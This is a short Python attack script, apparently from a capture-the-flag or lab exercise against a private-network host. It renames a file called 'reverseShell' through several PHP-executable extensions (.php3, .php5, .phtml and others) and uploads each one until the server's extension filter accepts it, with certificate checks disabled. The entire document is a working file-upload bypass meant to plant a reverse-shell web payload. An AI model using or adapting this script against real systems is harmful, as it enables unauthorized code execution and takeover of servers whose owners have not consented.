import requests
import urllib3
import os

url="http://10.48.159.179:3333/internal/index.php"
fileName="reverseShell"
currentName="reverseShell"
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)


extensions=[".php",".php",
".php3",
".php4",
".php5",
".phtml"]


for ext in extensions:
    newFileName=fileName+ext
    os.rename(currentName,newFileName)
    currentName=newFileName
    

    files={"file":open(newFileName,"rb")}
    r=requests.post(url,files=files,verify=False)

    if "Extension not allowed" in r.text:
        print("Extension not allowed")
    else:
        print(f"Accpted Extensiion is : {ext}")
        break




